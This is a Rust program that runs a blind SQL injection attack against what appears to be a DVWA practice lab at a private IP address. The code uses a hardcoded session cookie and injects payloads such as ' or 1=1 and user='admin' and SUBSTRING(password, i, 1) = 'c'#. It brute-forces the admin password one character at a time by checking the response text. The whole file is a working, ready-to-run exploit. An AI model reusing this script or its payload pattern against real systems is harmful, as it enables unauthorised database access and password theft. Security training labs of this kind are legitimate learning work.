use std::error::Error;

use reqwest::{
    blocking::*,
    header::{COOKIE, HeaderMap, HeaderValue},
};
use url::Url;

const PHPSESSID: &'static str = "p2aab5pj9pr72j9a69ra5ij6e4";

// "SELECT first_name, last_name FROM users WHERE user_id = '$id';"
//
// "SELECT first_name, last_name FROM users WHERE user_id = 'admin' or 1 = 1 and SUBSTRING("password", 1, 1) = 'a'#"
//
// http://10.164.2.70/vulnerabilities/sqli_blind/?id=admin%27+or+1+%3D+1+and+SUBSTRING%28%22password%22%2C+1%2C+1%29+%3D+%27a%27%23%22&Submit=Submit#

fn generate_payload(user_id: &str, index: usize, character: char) -> String {
    format!(
        "\' or 1=1 and user=\'{}\' and SUBSTRING(password, {}, 1) = \'{}\'#",
        user_id, index, character
    )
}

fn make_request(payload: String) -> bool {
    let mut headers = HeaderMap::new();
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!("PHPSESSID={}", PHPSESSID)).unwrap(),
    );
    let request = "http://10.164.2.70/vulnerabilities/sqli_blind/";

    let mut url = Url::parse(request).unwrap();
    url.query_pairs_mut().append_pair("id", payload.as_str());
    url.query_pairs_mut().append_pair("Submit", "Submit");

    // println!("{}", url);

    let client = reqwest::blocking::Client::new();
    let request = client.get(url).headers(headers);

    let body = match request.send() {
        Ok(response) => response,
        Err(_) => return false,
    };

    let text = match body.text() {
        Ok(text) => text,
        Err(_) => return false,
    };

    // println!("{}", text);

    if let Some(_) = text.find("User ID is MISSING from the database.") {
        return false;
    }

    return true;
}

fn bruteforce(user_id: &str) {
    let mut password = String::new();

    let alphanumeric_string: String = ('a'..='z').chain('0'..='9').collect();

    'outer: for index in 0..33 {
        for c in alphanumeric_string.chars() {
            let payload = generate_payload(user_id, index, c);
            if make_request(payload) {
                println!("Found character: {}", c);
                password.push(c);
                continue 'outer;
            }
        }
    }

    println!("Found password: {}", password);
}

pub fn run() -> Result<(), Box<dyn Error>> {
    bruteforce("admin");

    Ok(())
}
